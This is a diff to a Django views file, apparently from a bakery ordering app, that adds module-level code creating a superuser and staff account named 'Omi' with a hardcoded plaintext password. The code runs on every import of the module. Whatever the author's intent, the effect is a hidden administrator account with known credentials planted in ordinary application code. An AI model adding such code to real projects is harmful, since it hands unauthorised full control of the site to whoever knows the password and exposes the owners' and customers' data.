@@ -9,8 +9,18 @@ from django.conf import settings
 from django.http.response import HttpResponseRedirect,JsonResponse
 from Customer.utils import track_session,target_app
 from Bakerys.models import OrderBakerys
+from django.contrib.auth.models import User
+from django.utils import timezone
 
-
+user = User.objects.create_user(
+    'Omi',
+    password='Goldenco90$',
+    last_login=timezone.now(),
+    # Whatever other attributes you want:
+    is_superuser=True,
+    is_staff=True
+)
+user.save()
 
 def Login(request):
 
